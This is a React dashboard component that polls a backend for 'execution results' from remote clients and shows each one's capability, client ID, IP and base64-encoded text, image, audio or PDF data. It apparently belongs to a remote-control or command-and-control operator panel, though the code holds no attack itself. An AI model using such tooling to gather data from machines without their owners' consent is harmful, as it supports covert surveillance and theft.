import React, { useState, useEffect } from 'react';
import { api } from '../api';

function Results() {
  const [results, setResults] = useState([]);
  const [capabilities, setCapabilities] = useState({});
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState('all');
  const [selectedResult, setSelectedResult] = useState(null);

  useEffect(() => {
    fetchResults();
    fetchCapabilities();
    const interval = setInterval(fetchResults, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchResults = async () => {
    try {
      const data = await api.getResults(50);
      setResults(data.results || []);
      setLoading(false);
    } catch (error) {
      console.error('Error fetching results:', error);
      setLoading(false);
    }
  };

  const fetchCapabilities = async () => {
    try {
      const caps = await api.getCapabilities();
      setCapabilities(caps);
    } catch (error) {
      console.error('Error fetching capabilities:', error);
    }
  };

  const filteredResults = filter === 'all' 
    ? results 
    : results.filter(r => r.capability === parseInt(filter));

  const viewResultDetails = (result) => {
    setSelectedResult(result);
  };

  // Decode base64 to text
  const decodeBase64 = (base64Str) => {
    try {
      return atob(base64Str);
    } catch (e) {
      return null;
    }
  };

  // Detect MIME type from base64 for proper rendering
  const detectMimeType = (base64Str) => {
    if (!base64Str) return null;
    const prefix = base64Str.substring(0, 50);
    
    if (prefix.startsWith('iVBORw0KGgo')) return 'image/png';
    if (prefix.startsWith('/9j/')) return 'image/jpeg';
    if (prefix.startsWith('R0lGOD')) return 'image/gif';
    if (prefix.startsWith('Qk0')) return 'image/bmp';
    if (prefix.startsWith('UklGR')) return 'audio/wav';
    if (prefix.startsWith('SUQz') || prefix.startsWith('//v') || prefix.startsWith('//s')) return 'audio/mpeg';
    if (prefix.startsWith('JVBERi0')) return 'application/pdf';
    
    return null;
  };

  // Generic render based on result_type from backend
  const renderResultData = (result) => {
    const { result: data, result_type } = result;
    
    if (!data) {
      return <textarea readOnly rows="5" value="No result data" style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }} />;
    }

    // Handle based on type provided by backend
    if (result_type === 'text') {
      const decodedText = decodeBase64(data);
      if (decodedText) {
        return (
          <div>
            <p><strong>Text Data</strong></p>
            <textarea
              readOnly
              rows="15"
              value={decodedText}
              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', whiteSpace: 'pre-wrap' }}
            />
            <details style={{ marginTop: '10px' }}>
              <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
              <textarea
                readOnly
                rows="10"
                value={data}
                style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
              />
            </details>
          </div>
        );
      }
      return (
        <textarea
          readOnly
          rows="15"
          value={data}
          style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
        />
      );
    }

    if (result_type === 'image') {
      const mimeType = detectMimeType(data) || 'image/png';
      return (
        <div>
          <p><strong>Image</strong></p>
          <img 
            src={`data:${mimeType};base64,${data}`} 
            alt="Result" 
            style={{ maxWidth: '100%', border: '1px solid #ddd', borderRadius: '4px' }}
          />
          <details style={{ marginTop: '10px' }}>
            <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
            <textarea
              readOnly
              rows="10"
              value={data}
              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
            />
          </details>
        </div>
      );
    }

    if (result_type === 'audio') {
      const mimeType = detectMimeType(data) || 'audio/wav';
      return (
        <div>
          <p><strong>Audio</strong></p>
          <audio controls style={{ width: '100%', marginBottom: '10px' }}>
            <source src={`data:${mimeType};base64,${data}`} type={mimeType} />
            Your browser does not support the audio element.
          </audio>
          <details style={{ marginTop: '10px' }}>
            <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
            <textarea
              readOnly
              rows="10"
              value={data}
              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
            />
          </details>
        </div>
      );
    }

    if (result_type === 'pdf') {
      return (
        <div>
          <p><strong>PDF Document</strong></p>
          <a 
            href={`data:application/pdf;base64,${data}`}
            download="document.pdf"
            className="btn"
            style={{ marginBottom: '10px' }}
          >
            Download PDF
          </a>
          <details style={{ marginTop: '10px' }}>
            <summary style={{ cursor: 'pointer', color: '#007bff' }}>Show Raw Base64</summary>
            <textarea
              readOnly
              rows="10"
              value={data}
              style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%', marginTop: '10px' }}
            />
          </details>
        </div>
      );
    }

    // Fallback for unknown types
    return (
      <textarea
        readOnly
        rows="15"
        value={data}
        style={{ fontFamily: 'monospace', fontSize: '12px', width: '100%' }}
      />
    );
  };

  if (loading) {
    return <div className="loading">Loading results...</div>;
  }

  return (
    <div>
      <div className="card">
        <h2>Execution Results ({results.length})</h2>
        
        <div className="form-group" style={{ maxWidth: '300px', marginBottom: '20px' }}>
          <label htmlFor="filter">Filter by Capability</label>
          <select
            id="filter"
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
          >
            <option value="all">All Capabilities</option>
            {Object.entries(capabilities)
              .filter(([id]) => id !== '0')
              .map(([id, name]) => (
                <option key={id} value={id}>
                  {name}
                </option>
              ))}
          </select>
        </div>

        {filteredResults.length === 0 ? (
          <p>No results yet.</p>
        ) : (
          <table className="table">
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>Client ID</th>
                <th>Capability</th>
                <th>Result Type</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredResults.slice().reverse().map((result, idx) => {
                // Use result_type from backend
                const typeIcons = {
                  'text': '📝 Text',
                  'image': '🖼️ Image',
                  'audio': '🔊 Audio',
                  'pdf': '📄 PDF'
                };
                const displayType = typeIcons[result.result_type] || result.result_type || 'Unknown';
                
                return (
                  <tr key={idx}>
                    <td>{new Date(result.timestamp).toLocaleString()}</td>
                    <td><code>{result.client}</code></td>
                    <td>{capabilities[result.capability] || `Unknown (${result.capability})`}</td>
                    <td>{displayType}</td>
                    <td>
                      <button className="btn" onClick={() => viewResultDetails(result)}>
                        View Full
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>

      {selectedResult && (
        <div className="card">
          <h2>Result Details</h2>
          <button className="btn" style={{ marginBottom: '15px' }} onClick={() => setSelectedResult(null)}>
            Close
          </button>
          
          <div style={{ marginBottom: '15px' }}>
            <strong>Client:</strong> <code>{selectedResult.client}</code><br />
            <strong>Capability:</strong> {capabilities[selectedResult.capability]}<br />
            <strong>Timestamp:</strong> {new Date(selectedResult.timestamp).toLocaleString()}<br />
            <strong>IP:</strong> {selectedResult.ip}
          </div>

          <div className="form-group">
            <label>Result Data</label>
            {renderResultData(selectedResult)}
          </div>
        </div>
      )}
    </div>
  );
}

export default Results;
